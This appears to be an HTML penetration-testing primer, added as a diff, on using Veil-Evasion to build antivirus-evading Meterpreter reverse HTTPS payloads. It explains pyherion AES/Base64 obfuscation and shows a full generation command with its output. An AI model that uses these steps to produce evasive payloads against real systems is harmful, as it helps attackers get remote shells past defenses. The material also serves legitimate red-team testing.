@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>General Primer</title>
+</head><body>Veil-Framework is a collection of tools that help with information gathering and post-exploitation. One such tool is Veil-Evasion which is used for creating payloads that can easily bypass Antivirus using known and documented techniques. This is done through an array of encoding schemes that change the signatures of files dramatically enough to avoid standard detection techniques. You can download the framework by visiting the <a href="https://github.com/Veil-Framework/Veil">Veil Framework Github</a>.<br/>
+<br/>
+Generating obfuscated payloads<br/>
+During penetration tests, if a box has Antivirus installed, dropping and executing simple meterpreter binaries is more than likely going to be caught. In this case, you need to encode the binary. There are a couple of built in encoders in Metasploit (shikata ga nai is the most popular one), but these signatures have been updated in many Antivirus solutions, resulting in detection.<br/>
+<br/>
+A way to get around this is to use Veil-Evasion. This tool comes with thirty different payloads in C, C#, PowerShell, and Python languages. I almost always use the Python versions, simply because it was the only language in Veil-Evasion that supported Meterpreter reverse HTTPS connections (until recently). This is beneficial for shells because everything will be encrypted with SSL, preventing the commands and results from being transmitted in the clear and potentially being discovered by an IDS or IPS system. Another benefit of using Python is the ability to make contained payloads. This means that all the Meterpreter code needed for the reverse https connection is already included instead of only being a stager that downloads the rest of the code to run.<br/>
+<br/>
+When you select the Python language within Veil-Evasion, Veil creates executables by utilizing Wine. Specifically, it uses the py2exe and/or pyinstaller for compilation.. If you feel as though the normal encoding isn't quite enough, you can also use pyherion encoding. The pyherion option causes Veil to AES encrypt the payload with a random key. One of the benefits of Python is that you are able to dynamically execute functions. Using this technique, you can encrypt the source code using AES, then execute the code during runtime by calling the AES decryption function. This randomizes the original source code, making fingerprinting by AV more difficult. However, the decryption function of the code is still static (Exec(AES.new(“…). To solve this problem, the source code is Base64 encoded and wrapped in another exec call to obscure the decrypt function. Veil then obfuscates the required imports for AES and Base64 by using random names. In the end, you are left with dynamic execution of a Base64 encoded, AES encrypted payload which is almost completely randomized per generation. For more information on pyherion, visit the <a href="https://www.veil-framework.com/pyherion/">Veil team's blog</a>.<br/>
+<br/>
+Veil-Evasion also has command line switches that allow for easy scripting. This makes it dead simple to generate dynamic Veil-encoded Meterpreter payloads. Below is an example of a python reverse_https_contained Meterpreter executable using pyherion encoding being generated through the command line:<br/>
+<br/>
+root@kali:/# /root/tools/Github/Veil/Veil-Evasion/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c LHOST=127.0.0.1 LPORT=443 use_pyherion=Y --overwrite -o malicious ========================================================================= <br/>
+&nbsp;Veil-Evasion | [Version]: 2.9.0 <br/>
+========================================================================= &nbsp;<br/>
+[Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework <br/>
+========================================================================= &nbsp; &nbsp;<br/>
+[*] Executable written to: /root/veil-output/compiled/malicious.exe &nbsp; <br/>
+Language: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;python &nbsp;<br/>
+Payload: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; python/meterpreter/rev_https_contained &nbsp;<br/>
+Required Options: &nbsp; &nbsp; &nbsp;LHOST=127.0.0.1 &nbsp;LPORT=443 &nbsp;<br/>
+compile_to_exe=Y &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+inject_method=virtual &nbsp;<br/>
+use_pyherion=Y &nbsp;<br/>
+Payload File: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/root/veil-output/source/malicious.py &nbsp;<br/>
+Handler File: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/root/veil-output/handlers/malicious_handler.rc &nbsp; &nbsp;<br/>
+[*] Your payload files have been generated, don't get caught! &nbsp;<br/>
+[!] And don't submit samples to any online scanner! ;) <br/>
+<br/>
+Using this exe, you can now easily execute your Meterpreter code with a very low chance of being caught by AV.</body></html>
